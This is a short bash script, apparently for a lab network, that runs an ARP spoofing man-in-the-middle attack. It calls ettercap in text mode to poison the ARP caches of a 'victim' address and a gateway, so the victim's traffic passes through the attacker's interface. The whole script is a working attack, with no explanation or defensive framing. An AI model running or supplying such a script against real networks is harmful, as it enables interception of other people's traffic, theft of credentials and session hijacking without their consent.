#!/bin/bash
victim_ip="192.168.63.131"
gateway_ip="192.168.63.2"
interface="eth0"

echo "Starting ARP Spoofing..."
sudo ettercap -T -q -M arp:remote /$victim_ip/ /$gateway_ip/ -i $interface
